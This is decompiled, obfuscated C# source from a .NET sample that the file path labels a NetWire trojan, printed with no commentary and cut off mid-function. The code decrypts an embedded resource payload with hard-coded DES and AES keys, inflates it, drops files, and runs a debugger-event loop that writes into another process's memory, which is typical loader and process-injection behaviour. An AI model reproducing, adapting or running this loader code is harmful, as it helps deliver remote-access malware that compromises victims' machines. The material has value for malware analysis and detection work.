// Decompiled with JetBrains decompiler
// Type: ##
// Assembly: u1rug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=dbb94034cbd6bbd6
// MVID: C8A082E9-30A2-423A-BCDF-59565BB76FBE
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.NetWire.gen-baba76d578be903c9d78e3d6417636ba6a8069cafe9ccccdfce2bc19b43fc299.exe

using \u00230b;
using \u0023ac;
using \u0023e;
using \u0023t;
using \u0023yb;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

internal sealed class \u0023\u0023
{
  [NonSerialized]
  internal static GetString \u0088;

  [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  static extern IntPtr \u0023Hd([In] IntPtr obj0, [In] string obj1);

  static string \u0023ke([In] string obj0)
  {
    string str1 = \u0023\u0023.\u0088(241);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    string str2 = \u0023\u0023.\u0088(258);
    string str3;
    try
    {
      byte[] numArray1 = new byte[32];
      byte[] numArray2 = \u0003.\u007E\u0005((object) cryptoServiceProvider, \u0002.\u007E\u0004((object) \u0001.\u0001(), str1));
      \u0004.\u0006((Array) numArray2, 0, (Array) numArray1, 0, 10);
      \u0004.\u0006((Array) numArray2, 0, (Array) numArray1, 15, 10);
      \u0005.\u007E\u0007((object) rijndaelManaged, numArray1);
      \u0006.\u007E\u0008((object) rijndaelManaged, CipherMode.ECB);
      ICryptoTransform cryptoTransform = \u0007.\u007E\u000E((object) rijndaelManaged);
      byte[] numArray3 = \u0008.\u000F(obj0);
      str3 = \u000F.\u007E\u0011((object) \u0001.\u0001(), \u000E.\u007E\u0010((object) cryptoTransform, numArray3, 0, numArray3.Length));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0011.\u0013();
    }
    return str3;
  }

  static int \u0023rd([In] \u00239b.\u0023wc obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
  {
    int num1 = 0;
    while (obj0.\u0023vc > 0 && obj3 > 0)
    {
      obj1[obj2++] = (byte) obj0.\u0023uc;
      obj0.\u0023uc >>= 8;
      obj0.\u0023vc -= 8;
      --obj3;
      ++num1;
    }
    if (obj3 == 0)
      return num1;
    int num2 = obj0.\u0023tc - obj0.\u0023sc;
    if (obj3 > num2)
      obj3 = num2;
    Array.Copy((Array) obj0.\u0023rc, obj0.\u0023sc, (Array) obj1, obj2, obj3);
    obj0.\u0023sc += obj3;
    if ((obj0.\u0023sc - obj0.\u0023tc & 1) != 0)
    {
      obj0.\u0023uc = (uint) obj0.\u0023rc[obj0.\u0023sc++] & (uint) byte.MaxValue;
      obj0.\u0023vc = 8;
    }
    return num1 + obj3;
  }

  static bool \u0023wd([In] \u00239b.\u0023Qc obj0, [In] \u00239b.\u0023wc obj1)
  {
    while (true)
    {
      switch (obj0.\u0023fc)
      {
        case 0:
          obj0.\u0023Ic = \u0023\u0023.\u0023md(obj1, 5);
          if (obj0.\u0023Ic >= 0)
          {
            obj0.\u0023Ic += 257;
            \u0023\u0023.\u0023qd(obj1, 5);
            obj0.\u0023fc = 1;
            goto case 1;
          }
          else
            goto label_2;
        case 1:
          obj0.\u0023Jc = \u0023\u0023.\u0023md(obj1, 5);
          if (obj0.\u0023Jc >= 0)
          {
            ++obj0.\u0023Jc;
            \u0023\u0023.\u0023qd(obj1, 5);
            obj0.\u0023Lc = obj0.\u0023Ic + obj0.\u0023Jc;
            obj0.\u0023Gc = new byte[obj0.\u0023Lc];
            obj0.\u0023fc = 2;
            goto case 2;
          }
          else
            goto label_5;
        case 2:
          obj0.\u0023Kc = \u0023\u0023.\u0023md(obj1, 4);
          if (obj0.\u0023Kc >= 0)
          {
            obj0.\u0023Kc += 4;
            \u0023\u0023.\u0023qd(obj1, 4);
            obj0.\u0023Fc = new byte[19];
            obj0.\u0023Oc = 0;
            obj0.\u0023fc = 3;
            goto case 3;
          }
          else
            goto label_8;
        case 3:
          for (; obj0.\u0023Oc < obj0.\u0023Kc; ++obj0.\u0023Oc)
          {
            int num = \u0023\u0023.\u0023md(obj1, 3);
            if (num < 0)
              return false;
            \u0023\u0023.\u0023qd(obj1, 3);
            obj0.\u0023Fc[\u00239b.\u0023Qc.\u0023Pc[obj0.\u0023Oc]] = (byte) num;
          }
          obj0.\u0023Hc = new \u00239b.\u0023Cc(obj0.\u0023Fc);
          obj0.\u0023Fc = (byte[]) null;
          obj0.\u0023Oc = 0;
          obj0.\u0023fc = 4;
          goto case 4;
        case 4:
          int num1;
          while (((num1 = \u0023\u0023.\u0023Xd(obj0.\u0023Hc, obj1)) & -16) == 0)
          {
            obj0.\u0023Gc[obj0.\u0023Oc++] = obj0.\u0023Nc = (byte) num1;
            if (obj0.\u0023Oc == obj0.\u0023Lc)
              return true;
          }
          if (num1 >= 0)
          {
            if (num1 >= 17)
              obj0.\u0023Nc = (byte) 0;
            obj0.\u0023Mc = num1 - 16;
            obj0.\u0023fc = 5;
            goto case 5;
          }
          else
            goto label_19;
        case 5:
          int num2 = \u00239b.\u0023Qc.\u0023Ec[obj0.\u0023Mc];
          int num3 = \u0023\u0023.\u0023md(obj1, num2);
          if (num3 >= 0)
          {
            \u0023\u0023.\u0023qd(obj1, num2);
            int num4 = num3 + \u00239b.\u0023Qc.\u0023Dc[obj0.\u0023Mc];
            while (num4-- > 0)
              obj0.\u0023Gc[obj0.\u0023Oc++] = obj0.\u0023Nc;
            if (obj0.\u0023Oc != obj0.\u0023Lc)
            {
              obj0.\u0023fc = 4;
              continue;
            }
            goto label_29;
          }
          else
            goto label_24;
        default:
          continue;
      }
    }
label_2:
    return false;
label_5:
    return false;
label_8:
    return false;
label_19:
    return false;
label_24:
    return false;
label_29:
    return true;
  }

  static bool \u0023Ad([In] Assembly obj0, [In] Assembly obj1)
  {
    byte[] publicKey1 = obj0.GetName().GetPublicKey();
    byte[] publicKey2 = obj1.GetName().GetPublicKey();
    if (publicKey2 == null != (publicKey1 == null))
      return false;
    if (publicKey2 != null)
    {
      for (int index = 0; index < publicKey2.Length; ++index)
      {
        if ((int) publicKey2[index] != (int) publicKey1[index])
          return false;
      }
    }
    return true;
  }

  static int \u0023Vd([In] \u00239b.\u0023mc obj0, [In] \u00239b.\u0023wc obj1, [In] int obj2)
  {
    obj2 = Math.Min(Math.Min(obj2, 32768 - obj0.\u0023yc), \u0023\u0023.\u0023pd(obj1));
    int num1 = 32768 - obj0.\u0023xc;
    int num2;
    if (obj2 > num1)
    {
      num2 = \u0023\u0023.\u0023rd(obj1, obj0.\u0023rc, obj0.\u0023xc, num1);
      if (num2 == num1)
        num2 += \u0023\u0023.\u0023rd(obj1, obj0.\u0023rc, 0, obj2 - num1);
    }
    else
      num2 = \u0023\u0023.\u0023rd(obj1, obj0.\u0023rc, obj0.\u0023xc, obj2);
    obj0.\u0023xc = obj0.\u0023xc + num2 & (int) short.MaxValue;
    obj0.\u0023yc += num2;
    return num2;
  }

  static void \u0023qd([In] \u00239b.\u0023wc obj0, [In] int obj1)
  {
    obj0.\u0023uc >>= obj1;
    obj0.\u0023vc -= obj1;
  }

  static int \u0023Xd([In] \u00239b.\u0023Cc obj0, [In] \u00239b.\u0023wc obj1)
  {
    int index1;
    if ((index1 = \u0023\u0023.\u0023md(obj1, 9)) < 0)
    {
      int vc = obj1.\u0023vc;
      int index2 = \u0023\u0023.\u0023md(obj1, vc);
      int num = (int) obj0.\u0023zc[index2];
      if (num < 0 || (num & 15) > vc)
        return -1;
      \u0023\u0023.\u0023qd(obj1, num & 15);
      return num >> 4;
    }
    \u00239b.\u0023Cc cc = obj0;
    int num1;
    if ((num1 = (int) cc.\u0023zc[index1]) >= 0)
    {
      \u0023\u0023.\u0023qd(obj1, num1 & 15);
      return num1 >> 4;
    }
    int num2 = -(num1 >> 4);
    int num3 = num1 & 15;
    int num4;
    if ((num4 = \u0023\u0023.\u0023md(obj1, num3)) >= 0)
    {
      int num5 = (int) obj0.\u0023zc[num2 | num4 >> 9];
      \u0023\u0023.\u0023qd(obj1, num5 & 15);
      return num5 >> 4;
    }
    int vc1 = obj1.\u0023vc;
    int num6 = \u0023\u0023.\u0023md(obj1, vc1);
    int num7 = (int) obj0.\u0023zc[num2 | num6 >> 9];
    if ((num7 & 15) > vc1)
      return -1;
    \u0023\u0023.\u0023qd(obj1, num7 & 15);
    return num7 >> 4;
  }

  static short \u0023xd([In] int obj0) => (short) ((int) \u00239b.\u0023Wc.\u0023Rc[obj0 & 15] << 12 | (int) \u00239b.\u0023Wc.\u0023Rc[obj0 >> 4 & 15] << 8 | (int) \u00239b.\u0023Wc.\u0023Rc[obj0 >> 8 & 15] << 4 | (int) \u00239b.\u0023Wc.\u0023Rc[obj0 >> 12]);

  static bool \u0023od([In] \u00239b.\u0023qc obj0)
  {
    int num1 = \u0023\u0023.\u00233d(obj0.\u0023mc);
    if (true)
      goto label_25;
label_23:
    int num2;
    while (num2 >= 258)
    {
      switch (obj0.\u0023fc)
      {
        case 7:
          int num3;
          while (((num3 = \u0023\u0023.\u0023Xd(obj0.\u0023oc, obj0.\u0023lc)) & -256) == 0)
          {
            \u0023\u0023.\u0023Wd(obj0.\u0023mc, num3);
            if (--num2 < 258)
              return true;
          }
          if (num3 < 257)
          {
            if (num3 < 0)
              return false;
            obj0.\u0023pc = (\u00239b.\u0023Cc) null;
            obj0.\u0023oc = (\u00239b.\u0023Cc) null;
            obj0.\u0023fc = 2;
            return true;
          }
          obj0.\u0023hc = \u00239b.\u0023qc.\u0023bc[num3 - 257];
          obj0.\u0023gc = \u00239b.\u0023qc.\u0023cc[num3 - 257];
          goto case 8;
        case 8:
          if (obj0.\u0023gc > 0)
          {
            obj0.\u0023fc = 8;
            int num4 = \u0023\u0023.\u0023md(obj0.\u0023lc, obj0.\u0023gc);
            if (num4 < 0)
              return false;
            \u0023\u0023.\u0023qd(obj0.\u0023lc, obj0.\u0023gc);
            obj0.\u0023hc += num4;
          }
          obj0.\u0023fc = 9;
          goto case 9;
        case 9:
          int index = \u0023\u0023.\u0023Xd(obj0.\u0023pc, obj0.\u0023lc);
          if (index < 0)
            return false;
          obj0.\u0023ic = \u00239b.\u0023qc.\u0023dc[index];
          obj0.\u0023gc = \u00239b.\u0023qc.\u0023ec[index];
          goto case 10;
        case 10:
          if (obj0.\u0023gc > 0)
          {
            obj0.\u0023fc = 10;
            int num5 = \u0023\u0023.\u0023md(obj0.\u0023lc, obj0.\u0023gc);
            if (num5 < 0)
              return false;
            \u0023\u0023.\u0023qd(obj0.\u0023lc, obj0.\u0023gc);
            obj0.\u0023ic += num5;
          }
          \u0023\u0023.\u0023ld(obj0.\u0023mc, obj0.\u0023hc, obj0.\u0023ic);
          num2 -= obj0.\u0023hc;
          obj0.\u0023fc = 7;
          continue;
        default:
          continue;
      }
    }
    return true;
label_25:
    num2 = num1;
    goto label_23;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  static void \u0023td([In] \u0023d.\u0023i obj0)
  {
label_0:
    int num1;
    int num2;
    try
    {
      \u0011.\u0013();
      num2 = 1;
label_1:
      int num3 = 2;
      object obj1 = (object) \u0014.\u0018(\u0023\u0023.\u0088(258), \u0013.\u007E\u0017((object) \u0012.\u0015()), \u0023\u0023.\u0088(258));
label_2:
      num3 = 3;
      string str1 = \u0023\u0023.\u0088(259);
label_3:
      num3 = 4;
      string str2 = \u0023\u0023.\u0088(276);
label_4:
      num3 = 5;
      string str3 = \u0023\u0023.\u0088(293);
label_5:
      num3 = 6;
      string str4 = \u0023\u0023.\u0088(314);
label_6:
      num3 = 7;
      string str5 = \u0023\u0023.\u0088(335);
label_7:
      num3 = 8;
      string str6 = \u0016.\u001B(\u0015.\u0019(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(348))), \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(381)));
label_8:
      num3 = 9;
      string str7 = \u0016.\u001B(\u0015.\u0019(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(348))), \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(442)));
label_9:
      num3 = 10;
      bool flag = false;
label_10:
      num3 = 11;
      string[] strArray = new string[5]
      {
        str7,
        \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(503)),
        \u0023\u0023.\u0088(520),
        \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(525)),
        \u0023\u0023.\u0088(258)
      };
      if (!\u0019.\u001E((object) \u0017.\u001C(strArray), \u0018.\u001D(\u0018.\u001D(obj1, (object) \u0023\u0023.\u0088(258)), (object) \u0023\u0023.\u0088(258)), false))
        goto label_12;
label_11:
      num3 = 12;
      flag = true;
label_12:
      num3 = 14;
      string str8 = \u0023\u0023.\u0088(550);
label_13:
      num3 = 15;
      \u001A.\u001F(str8);
label_14:
      num3 = 16;
      int num4 = flag ? 1 : 0;
label_15:
      num3 = 18;
      ResourceManager resourceManager = new ResourceManager(\u0023\u0023.\u0088(559), \u0012.\u0016());
label_16:
      num3 = 19;
      string str9 = \u0014.\u0018(\u0023\u0023.\u0088(258), \u0015.\u0019(\u0023\u0023.\u0088(572)), \u0023\u0023.\u0088(258));
label_17:
      num3 = 20;
      \u0023\u0023.\u0023me(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(581)));
label_18:
      num3 = 22;
      string str10 = \u0016.\u001B(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(614)), \u0023\u0023.\u0088(647));
label_19:
      num3 = 23;
      byte[] numArray1 = numArray1;
label_20:
      num3 = 24;
      \u0023\u0023.\u0023ne(\u0023\u0023.\u0088(656), numArray1);
label_21:
      num3 = 25;
      if (flag)
        goto label_25;
label_22:
      num3 = 27;
label_23:
      num3 = 28;
      if (\u0019.\u001E(obj1, (object) \u0016.\u001B(str7, \u0023\u0023.\u0088(677)), false))
        goto label_25;
label_24:
      num3 = 30;
label_25:
      num3 = 33;
      string str11 = \u0014.\u0018(\u0015.\u0019(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(706))), \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(739)), \u0023\u0023.\u0023ke(\u0023\u0023.\u0088(828)));
label_26:
      num3 = 34;
label_27:
      num3 = 35;
      string empty = string.Empty;
label_28:
      num3 = 36;
      string str12 = \u001B.\u007F(\u0023\u0023.\u0088(258), str9, \u0023\u0023.\u0088(520), str10);
label_29:
      num3 = 37;
      byte[] numArray2 = (byte[]) \u001C.\u007E\u0080((object) resourceManager, \u0023\u0023.\u0088(861));
label_30:
      num3 = 38;
      byte[] numArray3 = \u0023\u0023.\u0023ne(\u0023\u0023.\u0023ke(\u0023\u0023.\u0088(874)), numArray2);
label_31:
      num3 = 39;
      StringBuilder stringBuilder = new StringBuilder(\u0023\u0023.\u0088(258));
label_32:
      num3 = 40;
      char[] chArray = \u001D.\u007E\u0081((object) \u0023\u0023.\u0088(935));
label_33:
      num3 = 41;
      object obj2 = (object) 6;
label_34:
      num3 = 42;
      string str13 = \u0023\u0023.\u0088(980);
      \u0023\u0023.\u0023Gd(1225, ref str13);
label_35:
      num3 = 43;
      \u001A.\u001F(\u0016.\u001B(str7, str10));
label_36:
      num3 = 44;
      \u001E.\u0082(str11, str12, true);
label_37:
      num3 = 45;
      \u0023\u0023.\u0023Jd(new object[6]
      {
        (object) string.Empty,
        (object) numArray3,
        (object) false,
        (object) false,
        (object) str12,
        (object) 65
      });
label_38:
      num3 = 46;
      \u001F.\u0083(10000);
      \u0011.\u0014();
      goto label_45;
label_40:
      num1 = num3;
      switch (num2)
      {
        case 1:
          int num5 = num1 + 1;
          num1 = 0;
          switch (num5)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
            case 14:
              goto label_12;
            case 15:
              goto label_13;
            case 16:
              goto label_14;
            case 17:
            case 18:
              goto label_15;
            case 19:
              goto label_16;
            case 20:
              goto label_17;
            case 21:
            case 22:
              goto label_18;
            case 23:
              goto label_19;
            case 24:
              goto label_20;
            case 25:
              goto label_21;
            case 26:
            case 29:
            case 31:
            case 32:
            case 33:
              goto label_25;
            case 27:
              goto label_22;
            case 28:
              goto label_23;
            case 30:
              goto label_24;
            case 34:
              goto label_26;
            case 35:
              goto label_27;
            case 36:
              goto label_28;
            case 37:
              goto label_29;
            case 38:
              goto label_30;
            case 39:
              goto label_31;
            case 40:
              goto label_32;
            case 41:
              goto label_33;
            case 42:
              goto label_34;
            case 43:
              goto label_35;
            case 44:
              goto label_36;
            case 45:
              goto label_37;
            case 46:
              goto label_38;
            case 47:
              goto label_45;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_40;
    }
    throw \u007F.\u0084(-2146828237);
label_45:
    if (num1 == 0)
      return;
    \u0011.\u0013();
  }

  static void \u0023le()
  {
  }

  static bool \u0023Sd([In] \u00239b.\u0023wc obj0) => obj0.\u0023sc == obj0.\u0023tc;

  static \u00239b.\u0023Cc \u0023zd([In] \u00239b.\u0023Qc obj0)
  {
    byte[] destinationArray = new byte[obj0.\u0023Ic];
    Array.Copy((Array) obj0.\u0023Gc, 0, (Array) destinationArray, 0, obj0.\u0023Ic);
    return new \u00239b.\u0023Cc(destinationArray);
  }

  static void \u0023Zd()
  {
    try
    {
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0023\u0023.\u0023Qd);
    }
    catch
    {
    }
  }

  static void \u00230d([In] \u00239b.\u0023mc obj0, [In] int obj1, [In] int obj2, [In] int obj3)
  {
    while (obj2-- > 0)
    {
      byte[] rc = obj0.\u0023rc;
      \u00239b.\u0023mc mc = obj0;
      int xc;
      int num1 = xc = mc.\u0023xc;
      mc.\u0023xc = xc + 1;
      int index = num1;
      int num2 = (int) obj0.\u0023rc[obj1++];
      rc[index] = (byte) num2;
      obj0.\u0023xc &= (int) short.MaxValue;
      obj1 &= (int) short.MaxValue;
    }
  }

  static byte[] \u0023Dd([In] byte[] obj0)
  {
    Assembly callingAssembly = Assembly.GetCallingAssembly();
    Assembly executingAssembly = Assembly.GetExecutingAssembly();
    if ((object) callingAssembly != (object) executingAssembly && !\u0023\u0023.\u0023Ad(executingAssembly, callingAssembly))
      return (byte[]) null;
    \u00239b.\u0023Xc xc = new \u00239b.\u0023Xc(obj0);
    byte[] numArray = new byte[0];
    int num1 = \u0023\u0023.\u0023Bd(xc);
    if (num1 == 67324752)
    {
      short num2 = (short) \u0023\u0023.\u0023Ud(xc);
      int num3 = \u0023\u0023.\u0023Ud(xc);
      int num4 = \u0023\u0023.\u0023Ud(xc);
      if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
        throw new FormatException("Wrong Header Signature");
      \u0023\u0023.\u0023Bd(xc);
      \u0023\u0023.\u0023Bd(xc);
      \u0023\u0023.\u0023Bd(xc);
      int length = \u0023\u0023.\u0023Bd(xc);
      int count1 = \u0023\u0023.\u0023Ud(xc);
      int count2 = \u0023\u0023.\u0023Ud(xc);
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        xc.Read(buffer, 0, count1);
      }
      if (count2 > 0)
      {
        byte[] buffer = new byte[count2];
        xc.Read(buffer, 0, count2);
      }
      byte[] buffer1 = new byte[xc.Length - xc.Position];
      xc.Read(buffer1, 0, buffer1.Length);
      \u00239b.\u0023qc qc = new \u00239b.\u0023qc(buffer1);
      numArray = new byte[length];
      \u0023\u0023.\u0023Yd(numArray.Length, qc, numArray, 0);
    }
    else
    {
      int num5 = num1 >> 24;
      if (num1 - (num5 << 24) != 8223355)
        throw new FormatException("Unknown Header");
      if (num5 == 1)
      {
        int length1 = \u0023\u0023.\u0023Bd(xc);
        numArray = new byte[length1];
        int num6;
        for (int index = 0; index < length1; index += num6)
        {
          int length2 = \u0023\u0023.\u0023Bd(xc);
          num6 = \u0023\u0023.\u0023Bd(xc);
          byte[] buffer = new byte[length2];
          xc.Read(buffer, 0, buffer.Length);
          \u00239b.\u0023qc qc = new \u00239b.\u0023qc(buffer);
          \u0023\u0023.\u0023Yd(num6, qc, numArray, index);
        }
      }
      if (num5 == 2)
      {
        using (ICryptoTransform cryptoTransform = \u0023\u0023.\u0023Id(true, new byte[8]
        {
          (byte) 190,
          (byte) 114,
          (byte) 124,
          (byte) 235,
          (byte) 162,
          (byte) 82,
          (byte) 131,
          (byte) 166
        }, new byte[8]
        {
          (byte) 88,
          (byte) 211,
          (byte) 111,
          (byte) 89,
          (byte) 93,
          (byte) 231,
          (byte) 252,
          (byte) 24
        }))
          numArray = \u0023\u0023.\u0023Dd(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
      if (num5 == 3)
      {
        using (ICryptoTransform cryptoTransform = \u0023\u0023.\u0023Pd(new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        }, new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        }, true))
          numArray = \u0023\u0023.\u0023Dd(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
    }
    xc.Close();
    return numArray;
  }

  static int \u0023Bd([In] \u00239b.\u0023Xc obj0) => \u0023\u0023.\u0023Ud(obj0) | \u0023\u0023.\u0023Ud(obj0) << 16;

  static void \u0023vd()
  {
    try
    {
      \u0023\u0023.\u0023Zd();
    }
    catch (Exception ex)
    {
    }
  }

  static int \u0023pd([In] \u00239b.\u0023wc obj0) => obj0.\u0023tc - obj0.\u0023sc + (obj0.\u0023vc >> 3);

  static ICryptoTransform \u0023Id([In] bool obj0, [In] byte[] obj1, [In] byte[] obj2)
  {
    using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
      return obj0 ? cryptoServiceProvider.CreateDecryptor(obj1, obj2) : cryptoServiceProvider.CreateEncryptor(obj1, obj2);
  }

  [DllImport("dfddddddfll", EntryPoint = "DhcpDeRegisterParamChange", CharSet = CharSet.Ansi, SetLastError = true)]
  static extern long \u0023Ed(int _param0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string _param1);

  static void \u0023sd([In] \u00239b.\u0023wc obj0)
  {
    obj0.\u0023uc >>= obj0.\u0023vc & 7;
    obj0.\u0023vc &= -8;
  }

  static unsafe void \u0023Rd([In] uint obj0, [In] \u0023u.\u0023J obj1, [In] int obj2)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(33);
    \u0023u.\u0023tb tb = \u0023s.\u0023o<\u0023u.\u0023tb>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(993)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1026)));
    \u0023u.\u0023ub ub = \u0023s.\u0023o<\u0023u.\u0023ub>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(993)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1087)));
    \u0023u.\u0023vb vb = \u0023s.\u0023o<\u0023u.\u0023vb>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(993)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1148)));
    \u0023u.\u0023wb wb = \u0023s.\u0023o<\u0023u.\u0023wb>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(993)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1209)));
    \u0023u.\u0023kb kb = \u0023s.\u0023o<\u0023u.\u0023kb>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(993)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1270)));
    \u0023u.\u0023sb sb = \u0023s.\u0023o<\u0023u.\u0023sb>(\u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1331)), \u0023\u0023.\u0023nd(\u0023\u0023.\u0088(1364)));
    *(sbyte*) ((IntPtr) voidPtr + 9) = (sbyte) 0;
    *(sbyte*) ((IntPtr) voidPtr + 10) = (sbyte) !tb(checked ((int) obj1.\u0023H));
    if (*(sbyte*) ((IntPtr) voidPtr + 10) != (sbyte) 0)
    {
      *(sbyte*) ((IntPtr) voidPtr + 11) = (sbyte) 0;
      throw new Exception();
    }
    int num1 = vb(false) ? 1 : 0;
    *(int*) voidPtr = 64;
    *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
    while (true)
    {
      \u0023u.\u00230 lpDebugEvent;
      do
      {
        *(sbyte*) ((IntPtr) voidPtr + 28) = *(sbyte*) ((IntPtr) voidPtr + 8);
        if (*(sbyte*) ((IntPtr) voidPtr + 28) != (sbyte) 0)
        {
          lpDebugEvent = new \u0023u.\u00230();
          *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) !ub(out lpDebugEvent, -1);
          if (*(sbyte*) ((IntPtr) voidPtr + 13) == (sbyte) 0)
          {
            switch (lpDebugEvent.\u0023U)
            {
              case \u0023u.\u0023jb.\u0023hb:
                *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (lpDebugEvent.\u0023Y().\u00233.\u00231 == 2147483649U);
                if (*(sbyte*) ((IntPtr) voidPtr + 14) != (sbyte) 0)
                {
                  int num2 = wb(lpDebugEvent.\u0023V, lpDebugEvent.\u0023W, 65538) ? 1 : 0;
                  *(sbyte*) ((IntPtr) voidPtr + 15) = (sbyte) !kb(obj1.\u0023F, obj0, obj2, 320U, ref *(uint*) voidPtr);
                  continue;
                }
                goto label_9;
              case \u0023u.\u0023jb.\u0023db:
                goto label_10;
              case \u0023u.\u0023jb.\u0023ib:
                goto label_6;
              default:
                goto label_22;
            }
          }
          else
            goto label_4;
        }
        else
          goto label_25;
      }
      while (*(sbyte*) ((IntPtr) voidPtr + 15) == (sbyte) 0);
      continue;
label_6:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      int num3 = wb(lpDebugEvent.\u0023V, lpDebugEvent.\u0023W, 1073807364) ? 1 : 0;
      goto label_23;
label_9:
      Thread.Sleep(400);
      int num4 = wb(lpDebugEvent.\u0023V, lpDebugEvent.\u0023W, 65538) ? 1 : 0;
      goto label_23;
label_10:
      *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
      try
      {
        *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) !kb(obj1.\u0023F, obj0, obj2, 320U, ref *(uint*) voidPtr);
        if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
          *(sbyte*) ((IntPtr) voidPtr + 18) = (sbyte) 0;
        Thread.Sleep(400);
        *(sbyte*) ((IntPtr) voidPtr + 19) = (sbyte) !kb(obj1.\u0023F, obj0, obj2, 320U, ref *(uint*) voidPtr);
        if (*(sbyte*) ((IntPtr) voidPtr + 19) != (sbyte) 0)
          *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Thread.Sleep(400);
        *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) !kb(obj1.\u0023F, obj0, obj2, 320U, ref *(uint*) voidPtr);
        if (*(sbyte*) ((IntPtr) voidPtr + 21) != (sbyte) 0)
          *(sbyte*) ((IntPtr) voidPtr + 22) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 23) = (sbyte) !kb(obj1.\u0023F, obj0, obj2, 320U, ref *(uint*) voidPtr);
        if (*(sbyte*) ((IntPtr) voidPtr + 23) == (sbyte) 0)
          ;
        ProjectData.ClearProjectError();
      }
      *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 0;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      // ISSUE: cast to a reference type
      *(sbyte*) ((IntPtr) voidPtr + 25) = (sbyte) (sb(obj1.\u0023G, (uint&) ((IntPtr) voidPtr + 4)) == -1);
      if (*(sbyte*) ((IntPtr) voidPtr + 25) == (sbyte) 0)
      {
        *(sbyte*) ((IntPtr) voidPtr + 26) = (sbyte) 0;
        int num5 = wb(lpDebugEvent.\u0023V, lpDebugEvent.\u0023W, 65538) ? 1 : 0;
        goto label_23;
      }
      else
        goto label_20;
label_22:
      int num6 = wb(lpDebugEvent.\u0023V, lpDebugEvent.\u0023W, 65538) ? 1 : 0;
label_23:
      GC.Collect();
      string str = \u0023\u0023.\u0088(1402);
      \u0023\u0023.\u0023Ed(1343, ref str);
      *(sbyte*) ((IntPtr) voidPtr + 27) = (sbyte) 0;
    }
label_4:
    throw new Exception();
label_20:
    throw new Exception(\u0023\u0023.\u0088(1397));
label_25:
    try
    {
      *(sbyte*) ((IntPtr) voidPtr + 29) = (sbyte) 0;
      StringBuilder stringBuilder = new StringBuilder();
      string str = (string) null;
      try
      {
        object Instance1;
